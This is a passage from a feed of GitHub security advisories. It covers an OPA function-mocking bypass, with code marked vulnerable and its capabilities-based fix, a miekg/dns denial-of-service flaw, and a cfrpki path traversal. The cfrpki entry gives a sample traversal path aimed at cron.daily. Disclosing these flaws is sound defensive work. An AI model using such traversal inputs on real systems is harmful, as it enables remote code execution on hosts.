<li>The policies evaluated include the <code>with</code> keyword to rewrite/mock a built-in, or custom, function to that of another built-in function, such as <code>http.send</code>.</li>
</ul>
<p><strong>Additionally, the OPA Query API</strong> is affected:</p>
<ul>
<li>If the OPA <a href="https://www.openpolicyagent.org/docs/latest/rest-api/#query-api">Query API</a> is exposed to the public, and it is relied on <code>http.send</code> to be unavailable in that context. Exposing the OPA API to the public without proper <a href="https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization">authentication and authorization</a> in place is generally advised against.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>v0.43.1, v0.44.0</p>
<h3 id="workarounds">Workarounds</h3>
<p>The <code>WithUnsafeBuiltins</code>  function has been considered deprecated since the introduction of the <a href="https://www.openpolicyagent.org/docs/latest/deployments/#capabilities">capabilities</a> feature in OPA v0.23.0 . While the function was commented as deprecated, the format of the comment was however not following the <a href="https://zchee.github.io/golang-wiki/Deprecated/">convention</a> for deprecated functions, and might not have been picked up by tooling like editors. This has now been fixed. Users are still encouraged to use the capabilities feature over the deprecated <code>WithUnsafeBuiltins</code> function.</p>
<p><strong>If you cannot upgrade</strong>, consider using capabilities instead:</p>
<p>Code like this using the <code>github.com/open-policy-agent/opa/ast</code> package:</p>
<pre><code class="language-go">// VULNERABLE with OPA &lt;= 0.43.0
unsafeBuiltins := map[string]struct{}{
    ast.HTTPSend.Name: struct{}{},
}
compiler := ast.NewCompiler().WithUnsafeBuiltins(unsafeBuiltins)
</code></pre>
<p>needs to be changed to this:</p>
<pre><code class="language-go">caps := ast.CapabilitiesForThisVersion()
var j int
for i, bi := range caps.Builtins {
    if bi.Name == ast.HTTPSend.Name {
        j = i
        break
    }
}
caps.Builtins[j] = caps.Builtins[len(caps.Builtins)-1] // put last element into position j
caps.Builtins = caps.Builtins[:len(caps.Builtins)-1]   // truncate slice

compiler := ast.NewCompiler().WithCapabilities(caps)
</code></pre>
<p>When using the <code>github.com/open-policy-agent/opa/rego</code> package:</p>
<pre><code class="language-go">// VULNERABLE with OPA &lt;= 0.43.0
r := rego.New(
    // other options omitted
    rego.UnsafeBuiltins(map[string]struct{}{ast.HTTPSend.Name: struct{}{}}),
)
</code></pre>
<p>needs to be changed to</p>
<pre><code class="language-go">r := rego.New(
    // other options omitted
    rego.Capabilities(caps),
)
</code></pre>
<p>with <code>caps</code> defined above.</p>
<p>Note that in the process, some error messages will change: <code>http.send</code> in this example will no longer be "unsafe" and thus forbidden, but it will simply become an "unknown function".</p>
<h3 id="references">References</h3>
<ul>
<li>Fix commit on <code>main</code>: <a href="https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823">https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823</a></li>
<li>Fix commit in 0.43.1 release: <a href="https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8">https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8</a>, release page for 0.43.1: <a href="https://github.com/open-policy-agent/opa/releases/tag/v0.43.1">https://github.com/open-policy-agent/opa/releases/tag/v0.43.1</a></li>
<li>Function mocking feature introduced in <a href="https://github.com/open-policy-agent/opa/pull/4540">https://github.com/open-policy-agent/opa/pull/4540</a> and <a href="https://github.com/open-policy-agent/opa/pull/4616">https://github.com/open-policy-agent/opa/pull/4616</a> </li>
<li>Documentation on the <a href="https://www.openpolicyagent.org/docs/latest/deployments/#capabilities">capabilities</a> feature, which is the preferred way of providing a list of allowed built-in functions. The capabilities feature is <strong>not</strong> affected by this vulnerability.</li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/open-policy-agent/community/discussions/categories/opa-and-rego">Community Discussions</a></li>
<li>Ask in Slack: <a href="https://slack.openpolicyagent.org/">https://slack.openpolicyagent.org/</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/open-policy-agent/opa/security/advisories/GHSA-f524-rf33-2jjr">https://github.com/open-policy-agent/opa/security/advisories/GHSA-f524-rf33-2jjr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36085">https://nvd.nist.gov/vuln/detail/CVE-2022-36085</a></li>
<li><a href="https://github.com/open-policy-agent/opa/pull/4540">https://github.com/open-policy-agent/opa/pull/4540</a></li>
<li><a href="https://github.com/open-policy-agent/opa/pull/4616">https://github.com/open-policy-agent/opa/pull/4616</a></li>
<li><a href="https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823">https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823</a></li>
<li><a href="https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8">https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8</a></li>
<li><a href="https://github.com/open-policy-agent/opa/releases/tag/v0.43.1">https://github.com/open-policy-agent/opa/releases/tag/v0.43.1</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0978">https://pkg.go.dev/vuln/GO-2022-0978</a></li>
<li><a href="https://github.com/advisories/GHSA-f524-rf33-2jjr">https://github.com/advisories/GHSA-f524-rf33-2jjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f524-rf33-2jjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-09-16T17:42:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/miekg/dns] Denial of Service in miekg-dns]]></title>
        <id>https://github.com/advisories/GHSA-p55x-7x9v-q8m4</id>
        <link href="https://github.com/advisories/GHSA-p55x-7x9v-q8m4"/>
        <updated>2024-01-23T20:37:02.000Z</updated>
        <content type="html"><![CDATA[<p>A denial of service flaw was found in miekg-dns before 1.0.4. A remote attacker could use carefully timed TCP packets to block the DNS server from accepting new connections.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-15133">https://nvd.nist.gov/vuln/detail/CVE-2017-15133</a></li>
<li><a href="https://github.com/miekg/dns/issues/627">https://github.com/miekg/dns/issues/627</a></li>
<li><a href="https://github.com/miekg/dns/pull/631">https://github.com/miekg/dns/pull/631</a></li>
<li><a href="https://github.com/miekg/dns/commit/43913f2f4fbd7dcff930b8a809e709591e4dd79e">https://github.com/miekg/dns/commit/43913f2f4fbd7dcff930b8a809e709591e4dd79e</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1538763">https://bugzilla.redhat.com/show_bug.cgi?id=1538763</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2020-0006">https://pkg.go.dev/vuln/GO-2020-0006</a></li>
<li><a href="https://github.com/advisories/GHSA-p55x-7x9v-q8m4">https://github.com/advisories/GHSA-p55x-7x9v-q8m4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p55x-7x9v-q8m4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-06-29T21:45:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki] Arbitrary filepath traversal via URI injection ]]></title>
        <id>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</id>
        <link href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh"/>
        <updated>2024-01-23T20:36:22.000Z</updated>
        <content type="html"><![CDATA[<p>OctoRPKI does not escape a URI with a filename containing "..", this allows a repository to create a file, (ex.  <code>rsync://example.org/repo/../../etc/cron.daily/evil.roa</code>), which would then be written to disk outside the base cache folder. This could allow for remote code execution on the host machine OctoRPKI is running on. </p>
<h2 id="patches">Patches</h2>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory email us at <a href="mailto:security@cloudflare.com">security@cloudflare.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3907">https://nvd.nist.gov/vuln/detail/CVE-2021-3907</a></li>
<li><a href="https://www.debian.org/security/2021/dsa-5033">https://www.debian.org/security/2021/dsa-5033</a></li>
<li><a href="https://www.debian.org/security/2022/dsa-5041">https://www.debian.org/security/2022/dsa-5041</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-3jhm-87m6-x959</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284">https://github.com/cloudflare/cfrpki/commit/eb9cc4db7b7b79e44f56dfaa959fccdfb2af8284</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0248">https://pkg.go.dev/vuln/GO-2022-0248</a></li>
<li><a href="https://github.com/cloudflare/cfrpki/commit/a053a808feeb3115c76b6cc263ee55598ce6e8cd">https://github.com/cloudflare/cfrpki/commit/a053a808feeb3115c76b6cc263ee55598ce6e8cd</a></li>
<li><a href="https://github.com/advisories/GHSA-cqh2-vc2f-q4fh">https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cqh2-vc2f-q4fh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-11-10T20:08:29.000Z</published>
    </entry>
</feed>